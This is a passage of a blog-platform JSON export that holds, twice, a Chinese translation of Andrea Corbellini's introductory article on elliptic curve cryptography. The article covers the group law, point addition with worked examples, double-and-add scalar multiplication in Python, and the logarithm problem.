[TLS](https://tools.ietf.org/html/rfc4492), [PGP](https://tools.ietf.org/html/rfc6637) 和 [SSH](https://tools.ietf.org/html/rfc5656) 里都能找到椭圆曲线密码学的身影, 这三种技术可以说是现代互联网和数字世界的基础, 更别提ECC在[比特币](https://en.bitcoin.it/wiki/Secp256k1)和其他各种加密货币中发挥的巨大作用了.\"}],[\"markdown\",{\"markdown\":\"在ECC开始流行以前, 绝大多数公钥加密算法都基于 RSA, DSA 和 DH 实现. 和ECC一样, RSA等如今仍然发挥着重要的作用. RSA等算法由于其相对容易解释的原理和[可以轻松实现的简化模型](http://code.activestate.com/recipes/578838-rsa-a-simple-and-easy-to-read-implementation/), 让很多人都能大概理解RSA是怎么一回事. 而对其中大多数人来说, ECC的实现原理却仍是个谜.\"}],[\"markdown\",{\"markdown\":\"希望通过这一系列的文章我能将你带入椭圆曲线密码学的世界. 我的**目标**并不是提供一份完整详尽的ECC指南(这样的资料在网上到处都能找到), 而是通过尽量简单的方式说明 **什么是ECC以及它为什么是安全的**, 而不必在冗长的数学证明和枯燥的实现细节上花费太多的时间.另外, 我还会提供一些交互式的可视化小工具和脚本来帮助你更好的理解内容.\"}],[\"markdown\",{\"markdown\":\"具体来说, 本系列文章将涉及以下内容: \\n\\n1. [实数域上的椭圆曲线和群论](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/) (本篇文章将会讨论)\\n2. [有限域上的椭圆曲线和离散对数难题](http://blog.chxj.name/elliptic-curve-cryptography-finite-fields-and-discrete-logarithms-zh)\\n3. [秘钥对的生成及两种ECC算法: ECDH和ECDSA](http://blog.chxj.name/elliptic-curve-cryptography-ecdh-and-ecdsa-zh)\\n4. [ECC破解算法和与RSA的对比](http://blog.chxj.name/elliptic-curve-cryptography-breaking-security-and-a-comparison-with-rsa-zh)\"}],[\"markdown\",{\"markdown\":\"为了更好的理解我们将要讨论的内容, 你需要先学习一点关于集合论, 几何学和模运算的基础, 并熟悉关于对称性和非对称密码学相关的基础知识. 最后, 你需要对什么是\\\"简单\\\"问题, 什么是\\\"复杂\\\"问题以及他们在密码学中锁扮演的角色有一个清晰的认识.\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线 \\n\\n首先, 什么是椭圆曲线? [Wolfram MathWorld](http://mathworld.wolfram.com/) 给出了一个超赞且完善的[定义](http://mathworld.wolfram.com/EllipticCurve.html). 但是考虑到本文目标,  可以把椭圆曲线简单的理解成一个满足以下方程式的点的集合: \"}],[\"html\",{\"html\":\"$$y^2 = x^3 + ax + b$$\"}],[\"html\",{\"html\":\"且满足 $4a^3 + 27b^2 \\\\ne 0$ (以便排除<a href=\\\"https://zh.wikipedia.org/wiki/%E5%A5%87%E7%82%B9_(%E6%95%B0%E5%AD%A6)\\\">奇点</a>). 上面的方程被称为椭圆曲线的维尔斯特拉斯标准形式(Weierstrass normal form).\"}],[\"image\",{\"src\":\"/content/images/2019/12/curves.png\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n不同椭圆曲线的形状 (b=1,  a 从 2 变到 -3).\\n</pre>\"}],[\"image\",{\"src\":\"/content/images/2019/12/singularities.png\"}],[\"html\",{\"html\":\"奇点的类型: 在左图曲线上存在一个尖锐点($y^2 = x^3$), 右图曲线发生了自交($y^2 = x^3 - 3x + 2$), 它们都不是有效的椭圆曲线.\"}],[\"markdown\",{\"markdown\":\"根据a和b值的不同, 椭圆曲线可能在平面上呈现出不同的形状, 我们可以很容易的看出,椭圆曲线是关于x轴对称的. 我们还需要一个无穷远处的点(也叫理想点)作为曲线的组成部分, 从现在起, 我们将用0(数字0)表示这个点.如果要显示的表现这个无穷远处的点, 可以通过下面的方程来完善我们的定义:\"}],[\"html\",{\"html\":\"$$\\\\left\\\\{ (x, y) \\\\in \\\\mathbb{R}^2\\\\ |\\\\ y^2 = x^3 + ax + b,\\\\ 4 a^3 + 27 b^2 \\\\ne 0 \\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{ 0 \\\\right\\\\}$$\"}],[\"markdown\",{\"markdown\":\"# 群\\n\\n\"}],[\"html\",{\"html\":\"<p>\\n数学上的群是指定义了一个用\\\"+\\\"表示的二元运算\\\"加法\\\"的集合. 为了让集合 $\\\\mathbb{G}$ 成为一个群, 就必须先定义一个加法运算并且这个集合应该遵循以下四条特征: \\n</p>\\n\\n<ol>\\n  <li> <strong>封闭性:</strong> 如果a和b都是 $\\\\mathbb{G}$ 中的元素, 那么 a+b 也应该是 $\\\\mathbb{G}$ 中的元素 </li>\\n  <li> <strong>结合律:</strong> $(a + b) + c = a + (b + c)$</li>\\n  <li> 存在<strong>单位元</strong> 0 满足 $a + 0 = 0 + a = a$ </li>\\n  <li> 任何元素都有一个与之相对应的<strong>逆元</strong>, 比如: 任何元素a都存在一个b使之满足 $a + b = 0$</li>\\n</ol>\\n\\n如果我们再加上第五个条件: \\n<br>\\n<strong>交换律:</strong> $a + b = b + a$\\n<br>\\n那么这个群就可以被称作<strong>阿贝尔群</strong>\\n\\n<p>\\n    根据加法的一般概念, 整数集合 $\\\\mathbb{Z}$ 是一个群 (更准确的说, 是一个阿贝尔群). 而自然数集合就不是一个群, 因为它无法满足第四个特征.\\n</p>\\n\\n<p>\\n    群很棒因为如果我们能证明以上四条特征是成立的, 那么我们就可以自动得到群的其他一些特征. 比如: <strong>单位元是唯一的</strong>; <strong>逆元也是唯一的</strong>, 意思是: 对群中的任何元素a来说, 有且仅有b使 $a + b = 0$ 成立(也可以把b写成-a). 这些关于群的特性稍后将会直接或间接的发挥重要的作用.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# [椭圆曲线上的群律](#group-law)\"}],[\"html\",{\"html\":\"<p>\\n    我们可以在椭圆曲线上定义一个群, 具体来说:\\n</p>\\n\\n<ul>\\n  <li>\\n    群里的元素是椭圆曲线上的点\\n  </li>\\n  <li>\\n    <strong>单位元</strong>是指在无穷远处的点 0\\n  </li>\\n  <li>\\n    点P的<strong>逆元</strong>是指其关于x轴对称的点\\n  </li>\\n  <li>\\n    <strong>加法</strong>可以根据以下规则定义: <strong>找到三个在一条线上非零的点P,Q和R, 他们之和满足 $P + Q + R = 0$</strong>\\n  </li>\\n</ul>\"}],[\"image\",{\"src\":\"/content/images/2019/12/three-aligned-points.png\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n在一条直线上的三点之和为0\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n    注意最后一条规则, 我们只要求三个点位于一条直线上, 但是并没有要其顺序. 这意味着如果 P,Q和R在一条直线上, 则有 $P + (Q + R) = Q + (P + R) = R + (P + Q) = \\\\cdots = 0$. 这样, 我们有了一个直观的证明, <strong>我们定义的加法运算也满足结合律和交换律, 这是一个阿贝尔群.</strong>\\n</p>\\n\\n<p>\\n    到目前为止, 一切都很顺利. 但我们到底应该如何计算任意两个点之和呢?\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 几何意义上的加法运算\"}],[\"html\",{\"html\":\"<p>\\n    还好这是一个阿贝尔群, 我们可以把 $P + Q + R = 0$ 写成 $P + Q = -R$. 借助这种形式的方程, 我们可以推导出一种计算P和Q之和的几何方法: <strong>过点P,Q画一条直线, 这条直线将和曲线相交于第三个点R(这意味着P,Q和R位于一条直线上). 点R的逆元-R正是 $P + Q$ 的结果</strong>.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/point-addition.png\",\"caption\":\"\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n过 P 和 Q 画一条直线交于第三点 R, 关于x轴与之对称的点 -R 即为 P+Q 之和.\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n  如果再做一些细化, 这个几何式的方法是行得通的. 具体来说, 我们需要回答以下几个问题: \\n    \\n  <ul>\\n    <li> <strong>当 P = 0 且 Q = 0 时会怎么样?</strong> 显然我们没法画出这样的直线(因为0根本不在xy平面上), 但是根据我们对单位元 0 的定义, $P + 0 = P$ 和 $0 + Q = Q$ 对任何 P 和 Q 都成立</li>\\n    <li> <strong>当 P = -Q 时会怎么样?</strong> 在这种情况下, 穿过两点的直线将与x轴垂直且不与其他任何点相交. 但当 P 是 Q 的逆元, 根据逆元的定义则有 $P + Q = P + (-P) = 0$ </li>\\n    <li> <strong>当 P = Q 时会怎么样?</strong> 在这种情况下, 过这个点可以作出无穷多条直线. 这里问题就开始变得有点复杂了. 首先考虑当 $Q' \\\\ne P$, 而让 Q' 逐渐接近 P 时会发生什么? </li>\\n  </ul>\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/animation-point-doubling.gif\",\"caption\":\"\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n当两点逐渐靠近, 过这两个点的直线将变成曲线的一条切线\\n</pre>\"}],[\"html\",{\"html\":\"当 Q' 朝着 P 移动时, 穿过 P 和 Q' 的直线将变为曲线的一条切线. 据此我们可以得出解决 $P + P = -R$, R 是 P 点在曲线上的切线与曲线的交点.\"}],[\"html\",{\"html\":\"<p>\\n  <ul>\\n    <li> <strong> 如果 $P \\\\ne Q$, 而又不存在第三个点 R 呢?</strong> 这种情况和前一种很类似, 事实上这就是一条线经过了 P 和曲线上的一个切点 Q 的情况 </li>\\n  </ul>\\n<p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/animation-tangent-line.gif\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n如果直线与曲线只相交于两点, 这表明这条线与曲线相切. \\n很容易就能看出两点之和为切点关于x轴的对称点.\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n  假设 P 是曲线上的切点, 在前一种情况下我们用 $P + P = -Q$ 表示, 这个方程也可以写成 $P + Q = -P$. 换句话说, 现在如果 Q 是曲线上的切点, 那么上面的等式就变成了 $Q + P = -Q$.\\n</p>\\n\\n<p>\\n  现在, 几何式的方法已经可以覆盖所有的场景了, 只需要一支铅笔和一把尺子我们就能计算出如何椭圆曲线上两个点的和. 如果你有兴趣的话, <strong>也可以看看我做的这个计算椭圆曲线加法的 <a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html\\\">HTML5/JavaScript版可视化工具</a> !</strong>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 代数意义上的加法运算\"}],[\"html\",{\"html\":\"<p>\\n  如果你想用计算机来算两点之和, 我们就需要将几何式的求解方法转换成代数式的方法. 把上面的求解方法翻译成一系列的方程看起来很容易, 但是因为需要求解三次方程实际上也比较枯燥. 所以在这里我会直接给出结果.\\n</p>\\n\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注: \\n椭圆曲线加法方程的代数方法推导在 <strong> <a href=\\\"https://github.com/jimmysong/programmingbitcoin/blob/master/ch02.asciidoc#coding-point-addition\\\"> Promgramming BitCoin 的第二章 </a> </strong> \\n中给出了详细的演算过程, 有兴趣的同学可以前往阅读 \\n</pre>\\n\\n<p>\\n    首先, 我们先排除各种麻烦的边界情况. 我们已经知道 $P + (-P) = 0$, 我们也知道 $P + 0 = 0 + P = P$, 所以在我们的方程式里我们会排除这两种情况, 我们只用考虑 <strong> 两个非零点, 以及非对称点 $P = (x_P, y_P)$ 和 $Q = (x_Q, y_Q)$. </strong>\\n</p>\\n\\n<p>\\n    如果 P 和 Q 不相等 ($x_P \\\\ne x_Q$), 则过两点的直线的斜率为:\\n    $$ m = \\\\frac{y_P - y_Q}{x_P - x_Q} $$ \\n    这条直线与椭圆曲线的交点 $R = (x_R, y_R)$ 有:\\n    $$ \\n    \\\\begin{array}{rcl}\\n    x_R & = & m^2 - x_P - x_Q \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P)\\n\\t\\\\end{array} \\n    $$\\n    或者写成: \\n    $$ y_R = y_Q + m(x_R - x_Q) $$\\n    则有 $(x_P, y_P) + (x_Q, y_Q) = (x_R, -y_R)$ (注意等式中的符号并始终牢记公式 $P + Q = -R$)\\n</p>\\n\\n<p>\\n    如果想要验证结果的正确性, 我们需要检查 R 是否是曲线上的一个点, 以及 P, R 和 Q 是否在一条直线上. 验证 P, R 和 Q 在一条直线上很容易, 但是检查 R 是否是曲线上的一点就没那么容易了, 因为这又需要求解三次方程, 会比较麻烦\\n</p>\\n\\n<p>\\n    作为替代方案, 我们可以用一个<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html\\\">可视化工具</a>通过一个例子来说明. 现在有 $P = (1, 2)$ , $Q = (3, 4)$ 在曲线 $y^2 = x^3 - 7x + 10$ 上, 这两点之和为 $P + Q = -R = (-3, 2)$. 我们来看看带入方程是否成立: \\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{y_P - y_Q}{x_P - x_Q} = \\\\frac{2 - 4}{1 - 3} = 1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = 1^2 - 1 - 3 = -3 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 2 + 1 \\\\cdot (-3 - 1) = -2 \\\\\\\\\\n    & = & y_Q + m(x_R - x_Q) = 4 + 1 \\\\cdot (-3 - 3) = -2\\n\\\\end{array}\\n    $$\\n    很好, 结果是正确的!\\n</p>\\n\\n<p>\\n  注意, 上面的方程在 <strong>P 或者 Q 是曲线上的切点<strong>时仍然是成立的. 让我们再试试 $P = (-1, 4)$ , $Q = (1, 2)$ 的情况.\\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{y_P - y_Q}{x_P - x_Q} = \\\\frac{4 - 2}{-1 - 1} = -1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = (-1)^2 - (-1) - 1 = 1 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 4 + -1 \\\\cdot (1 - (-1)) = 2\\n\\\\end{array}\\n    $$\\n  我们得出 $P + Q = (1, -2)$, 这个结果和用<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html?px=-1&py=4&qx=1&qy=2\\\">可视化工具</a>算出的结果是一样的\\n</p>\\n    \\n<p>\\n    当 $P = Q$ 时, 处理起来会有点区别: 求 $x_R$ 和 $y_R$ 的方程是一样的, 不过由于 $x_P = x_Q$, 我们需要用不同的方程来计算<strong>斜率</strong>:\\n    $$ m = \\\\frac{3 x_P^2 + a}{2 y_P} $$\\n    正如我们所料, m 的表达式是如下方程的一阶导数: \\n    $$ y_P = \\\\pm \\\\sqrt{x_P^3 + ax_P + b} $$\\n    检查 R 点位于椭圆曲线上且穿过 P, R 两点的直线与曲线有且仅有两个交点就能证明结果的正确性, 但和前面一样, 我们还是通过一个例子来验证, 当 P = Q = (1, 2) 时\\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{3x_P^2 + a}{2 y_P} = \\\\frac{3 \\\\cdot 1^2 - 7}{2 \\\\cdot 2} = -1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = (-1)^2 - 1 - 1 = -1 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 2 + (-1) \\\\cdot (-1 - 1) = 4\\n\\\\end{array}\\n    $$\\n    可以得出 $P + P = -R = (-1, -4)$, <a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html?px=1&py=2&qx=1&qy=2\\\">结果是正确的!</a>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 标量乘法\"}],[\"html\",{\"html\":\"<p>\\n\\t除加法外, 我们还可以定义另一种运算: <strong>标量乘法</strong>, 如下: \\n    $$ \\n    nP = \\\\underbrace{P + P + \\\\cdots + P}_{n\\\\ \\\\text{times}}\\n    $$\\n  \\t这里的 n 是一个自然数. 我也做了一个计算标量乘法的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-mul.html\\\">可视化工具</a>, 有兴趣的话可以看看.\\n</p>\\n\\n<p>\\n  写成上面的形式, 看起来计算 nP 需要进行 n 次加法. 当 n 是一个k位(二进制)的数字, 我们的算法复杂度将会是 $O(2^k)$, 这太差了. 但实际上我们可以有更快的算法.\\n</p>\\n\\n<p>\\n  其中一种叫做<strong>倍加法</strong>(double and add algorithm). 通过一个例子我们可以更好地解释它的原理. 当 n = 151, 表示为二进制 $10010111_2$, 借助其二进制形式我们可以用以下表达式来表示:\\n    $$\\n    \\\\begin{array}{rcl}\\n    151 & = & 1 \\\\cdot 2^7 + 0 \\\\cdot 2^6 + 0 \\\\cdot 2^5 + 1 \\\\cdot 2^4 + 0 \\\\cdot 2^3 + 1 \\\\cdot 2^2 + 1 \\\\cdot 2^1 + 1 \\\\cdot 2^0 \\\\\\\\\\n    & = & 2^7 + 2^4 + 2^2 + 2^1 + 2^0\\n\\\\end{array}\\n    $$\\n    (将n转换成二进制并表示为多个2的指数次之和)\\n    通过上面的表达式, 我们可以写出: \\n    $$\\n    151 \\\\cdot P = 2^7 P + 2^4 P + 2^2 P + 2^1 P + 2^0 P\\n    $$\\n    倍加法的具体实现步骤如下:\\n    <ul>\\n        <li> 找到点 P </li>\\n        <li> 翻倍, 得到 2P </li>\\n        <li> 用 2P 加 P (得到 $2^1P + 2^0P$ 的结果) </li>\\n        <li> 2P 翻倍, 得到 2^2P </li>\\n        <li> 将其加入之前的结果中 (得到 $2^2P + 2^1P + 2^0P$ 的结果) </li>\\n        <li> $2^2P$ 翻倍得到 $2^3P$ </li>\\n        <li> 别加$2^3P$ </li>\\n        <li> $2^3P$ 翻倍得到 $2^4P$ </li>\\n        <li> 加入之前的结果(得到 $2^4P + 2^2P + 2^1P + 2^0P$) </li>\\n        <li> ... </li>\\n    </ul>\\n最后, 只需要通过7次翻倍(自己加自己)和4次累加就可以计算出 $151 \\\\cdot P$ 的结果. 要是还说得不够清楚, 这里有一个 Python脚本实现了这个算法\\n</p>\"}],[\"markdown\",{\"markdown\":\"```python\\ndef bits(n):\\n    \\\"\\\"\\\"\\n    Generates the binary digits of n, starting\\n    from the least significant bit.\\n\\n    bits(151) -> 1, 1, 1, 0, 1, 0, 0, 1\\n    \\\"\\\"\\\"\\n    while n:\\n        yield n & 1\\n        n >>= 1\\n\\ndef double_and_add(n, x):\\n    \\\"\\\"\\\"\\n    Returns the result of n * x, computed using\\n    the double and add algorithm.\\n    \\\"\\\"\\\"\\n    result = 0\\n    addend = x\\n\\n    for bit in bits(n):\\n        if bit == 1:\\n            result += addend\\n        addend *= 2\\n\\n    return result\\n```\"}],[\"html\",{\"html\":\"<p>\\n因为翻倍和叠加都是 $O(1)$ 复杂度的运算, 那么这个算法的复杂度就是 $O(\\\\log n)$ (或者说 $O(k)$, k是数字的位长), 这样就挺好了. 至少比最开始复杂度为 $O(n)$ 的算法要好得多!\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 对数\"}],[\"html\",{\"html\":\"<p>\\n已知 n 和 P, 现在我们至少有一种方法可以在多项式时间算法可以算出 $Q = nP$. 但是如果反过来会怎么样? <strong>如果我们已知 Q 和 P 想要找出 n 呢.?</strong> 这个就是所谓的 <strong>对数难题.</strong> 我们把这个问题称作\\\"对数\\\"而不是\\\"除法\\\"主要是为了和其他密码学系统在概念上保持一致(在其他密码学系统中一般用指数而不是乘法).\\n</p>\\n\\n<p>\\n    我没听说过任何\\\"简单\\\"的算法可以用于解决对数难题, 不过通过<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-mul.html?a=-3&b=1&px=0&py=1\\\">尝试乘法</a>倒是可以找到一些规律. 比如, 已知曲线 $y^2 = x^3 - 3x + 1$ 和点 $P = (0, 1)$, 我们可以立刻验证出, 当 n 是一个奇数时,  $nP$ 会位于曲线的左侧平面, 如果 n 是一个偶数, $nP$ 会位于曲线的右侧平面. 如果我们做更多实验, 我们也许能够找出更多这样的规律, 也许可以帮助我们找到高效计算椭圆曲线上对数难题的方法.\\n</p>\\n\\n<p>\\n    不过对数难题还有一个变体: 离散对数难题. 在下一篇文章里我们将会看到, 如果我们缩小椭圆曲线的域, <strong>计算标量乘法仍然是\\\"容易的\\\", 不过求解离散对数将会成为一个\\\"十分困难\\\"的问题.</strong> 这个特性将成为椭圆曲线密码学的关键.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 下周见\"}],[\"html\",{\"html\":\"<p>\\n    这就是今天的全部内容, 希望你能喜欢这篇博客! 下周我们将会通过一些例子和小工具探索 <strong>有限域</strong> 以及 <strong>离散对数难题</strong>. 如果这些内容听起来还不错, 那么就敬请期待吧!\\n</p>\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[10,13],[10,14],[10,15],[10,16],[10,17],[10,18],[10,19],[10,20],[10,21],[10,22],[10,23],[10,24],[10,25],[10,26],[10,27],[10,28],[10,29],[10,30],[10,31],[10,32],[10,33],[10,34],[10,35],[10,36],[10,37],[10,38],[10,39],[10,40],[10,41],[10,42],[10,43],[10,44],[10,45],[1,\"p\",[]]]}","created_at_ts":1577086076449,"created_at":"2019-12-23 07:27:56"},{"id":"5e006ce32ee0ee00018198c1","post_id":"5dfc7ca42ee0ee000181900e","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<script type=\\\"text/javascript\\\" async\\n  src=\\\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\\\">\\n</script>\\n\\n<script type=\\\"text/x-mathjax-config\\\">\\n  MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});\\n</script>\"}],[\"markdown\",{\"markdown\":\"> 本文翻译自爱尔兰AWS工程师 ANDREA CORBELLINI 关于椭圆曲线密码学四篇博客中的第一篇, 原文采用 [CC-BY 4.0 协议](https://creativecommons.org/licenses/by/4.0/deed.zh) 进行授权\\n> 原文链接 : https://andrea.corbellini.name/2015/05/17/elliptic-curve-cryptography-a-gentle-introduction/\\n> 原作者: [ANDREA CORBELLINI](https://andrea.corbellini.name/)\\n> 译者: [chxj1992](http://blog.chxj.name/)\"}],[\"markdown\",{\"markdown\":\"如果你们知道什么是椭圆曲线密码学, 那你们应该也听说过 **ECC**, **ECD**或者**ECDSA**. ECC是椭圆曲线密码学(`Elliptic Curve Cryptography`)的首字母缩写, 而另外两个都是基于ECC实现的算法.\"}],[\"markdown\",{\"markdown\":\"如今, 我们在 [TLS](https://tools.ietf.org/html/rfc4492), [PGP](https://tools.ietf.org/html/rfc6637) 和 [SSH](https://tools.ietf.org/html/rfc5656) 里都能找到椭圆曲线密码学的身影, 这三种技术可以说是现代互联网和数字世界的基础, 更别提ECC在[比特币](https://en.bitcoin.it/wiki/Secp256k1)和其他各种加密货币中发挥的巨大作用了.\"}],[\"markdown\",{\"markdown\":\"在ECC开始流行以前, 绝大多数公钥加密算法都基于 RSA, DSA 和 DH 实现. 和ECC一样, RSA等如今仍然发挥着重要的作用. RSA等算法由于其相对容易解释的原理和[可以轻松实现的简化模型](http://code.activestate.com/recipes/578838-rsa-a-simple-and-easy-to-read-implementation/), 让很多人都能大概理解RSA是怎么一回事. 而对其中大多数人来说, ECC的实现原理却仍是个谜.\"}],[\"markdown\",{\"markdown\":\"希望通过这一系列的文章我能将你带入椭圆曲线密码学的世界. 我的**目标**并不是提供一份完整详尽的ECC指南(这样的资料在网上到处都能找到), 而是通过尽量简单的方式说明 **什么是ECC以及它为什么是安全的**, 而不必在冗长的数学证明和枯燥的实现细节上花费太多的时间.另外, 我还会提供一些交互式的可视化小工具和脚本来帮助你更好的理解内容.\"}],[\"markdown\",{\"markdown\":\"具体来说, 本系列文章将涉及以下内容: \\n\\n1. [实数域上的椭圆曲线和群论](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/) (本篇文章将会讨论)\\n2. [有限域上的椭圆曲线和离散对数难题](http://blog.chxj.name/elliptic-curve-cryptography-finite-fields-and-discrete-logarithms-zh)\\n3. [秘钥对的生成及两种ECC算法: ECDH和ECDSA](http://blog.chxj.name/elliptic-curve-cryptography-ecdh-and-ecdsa-zh)\\n4. [ECC破解算法和与RSA的对比](http://blog.chxj.name/elliptic-curve-cryptography-breaking-security-and-a-comparison-with-rsa-zh)\"}],[\"markdown\",{\"markdown\":\"为了更好的理解我们将要讨论的内容, 你需要先学习一点关于集合论, 几何学和模运算的基础, 并熟悉关于对称性和非对称密码学相关的基础知识. 最后, 你需要对什么是\\\"简单\\\"问题, 什么是\\\"复杂\\\"问题以及他们在密码学中锁扮演的角色有一个清晰的认识.\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线 \\n\\n首先, 什么是椭圆曲线? [Wolfram MathWorld](http://mathworld.wolfram.com/) 给出了一个超赞且完善的[定义](http://mathworld.wolfram.com/EllipticCurve.html). 但是考虑到本文目标,  可以把椭圆曲线简单的理解成一个满足以下方程式的点的集合: \"}],[\"html\",{\"html\":\"$$y^2 = x^3 + ax + b$$\"}],[\"html\",{\"html\":\"且满足 $4a^3 + 27b^2 \\\\ne 0$ (以便排除<a href=\\\"https://zh.wikipedia.org/wiki/%E5%A5%87%E7%82%B9_(%E6%95%B0%E5%AD%A6)\\\">奇点</a>). 上面的方程被称为椭圆曲线的维尔斯特拉斯标准形式(Weierstrass normal form).\"}],[\"image\",{\"src\":\"/content/images/2019/12/curves.png\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n不同椭圆曲线的形状 (b=1,  a 从 2 变到 -3).\\n</pre>\"}],[\"image\",{\"src\":\"/content/images/2019/12/singularities.png\"}],[\"html\",{\"html\":\"奇点的类型: 在左图曲线上存在一个尖锐点($y^2 = x^3$), 右图曲线发生了自交($y^2 = x^3 - 3x + 2$), 它们都不是有效的椭圆曲线.\"}],[\"markdown\",{\"markdown\":\"根据a和b值的不同, 椭圆曲线可能在平面上呈现出不同的形状, 我们可以很容易的看出,椭圆曲线是关于x轴对称的. 我们还需要一个无穷远处的点(也叫理想点)作为曲线的组成部分, 从现在起, 我们将用0(数字0)表示这个点.如果要显示的表现这个无穷远处的点, 可以通过下面的方程来完善我们的定义:\"}],[\"html\",{\"html\":\"$$\\\\left\\\\{ (x, y) \\\\in \\\\mathbb{R}^2\\\\ |\\\\ y^2 = x^3 + ax + b,\\\\ 4 a^3 + 27 b^2 \\\\ne 0 \\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{ 0 \\\\right\\\\}$$\"}],[\"markdown\",{\"markdown\":\"# 群\\n\\n\"}],[\"html\",{\"html\":\"<p>\\n数学上的群是指定义了一个用\\\"+\\\"表示的二元运算\\\"加法\\\"的集合. 为了让集合 $\\\\mathbb{G}$ 成为一个群, 就必须先定义一个加法运算并且这个集合应该遵循以下四条特征: \\n</p>\\n\\n<ol>\\n  <li> <strong>封闭性:</strong> 如果a和b都是 $\\\\mathbb{G}$ 中的元素, 那么 a+b 也应该是 $\\\\mathbb{G}$ 中的元素 </li>\\n  <li> <strong>结合律:</strong> $(a + b) + c = a + (b + c)$</li>\\n  <li> 存在<strong>单位元</strong> 0 满足 $a + 0 = 0 + a = a$ </li>\\n  <li> 任何元素都有一个与之相对应的<strong>逆元</strong>, 比如: 任何元素a都存在一个b使之满足 $a + b = 0$</li>\\n</ol>\\n\\n如果我们再加上第五个条件: \\n<br>\\n<strong>交换律:</strong> $a + b = b + a$\\n<br>\\n那么这个群就可以被称作<strong>阿贝尔群</strong>\\n\\n<p>\\n    根据加法的一般概念, 整数集合 $\\\\mathbb{Z}$ 是一个群 (更准确的说, 是一个阿贝尔群). 而自然数集合就不是一个群, 因为它无法满足第四个特征.\\n</p>\\n\\n<p>\\n    群很棒因为如果我们能证明以上四条特征是成立的, 那么我们就可以自动得到群的其他一些特征. 比如: <strong>单位元是唯一的</strong>; <strong>逆元也是唯一的</strong>, 意思是: 对群中的任何元素a来说, 有且仅有b使 $a + b = 0$ 成立(也可以把b写成-a). 这些关于群的特性稍后将会直接或间接的发挥重要的作用.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线上的群律\\n[](#group-law)\"}],[\"html\",{\"html\":\"<p>\\n    我们可以在椭圆曲线上定义一个群, 具体来说:\\n</p>\\n\\n<ul>\\n  <li>\\n    群里的元素是椭圆曲线上的点\\n  </li>\\n  <li>\\n    <strong>单位元</strong>是指在无穷远处的点 0\\n  </li>\\n  <li>\\n    点P的<strong>逆元</strong>是指其关于x轴对称的点\\n  </li>\\n  <li>\\n    <strong>加法</strong>可以根据以下规则定义: <strong>找到三个在一条线上非零的点P,Q和R, 他们之和满足 $P + Q + R = 0$</strong>\\n  </li>\\n</ul>\"}],[\"image\",{\"src\":\"/content/images/2019/12/three-aligned-points.png\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n在一条直线上的三点之和为0\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n    注意最后一条规则, 我们只要求三个点位于一条直线上, 但是并没有要其顺序. 这意味着如果 P,Q和R在一条直线上, 则有 $P + (Q + R) = Q + (P + R) = R + (P + Q) = \\\\cdots = 0$. 这样, 我们有了一个直观的证明, <strong>我们定义的加法运算也满足结合律和交换律, 这是一个阿贝尔群.</strong>\\n</p>\\n\\n<p>\\n    到目前为止, 一切都很顺利. 但我们到底应该如何计算任意两个点之和呢?\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 几何意义上的加法运算\"}],[\"html\",{\"html\":\"<p>\\n    还好这是一个阿贝尔群, 我们可以把 $P + Q + R = 0$ 写成 $P + Q = -R$. 借助这种形式的方程, 我们可以推导出一种计算P和Q之和的几何方法: <strong>过点P,Q画一条直线, 这条直线将和曲线相交于第三个点R(这意味着P,Q和R位于一条直线上). 点R的逆元-R正是 $P + Q$ 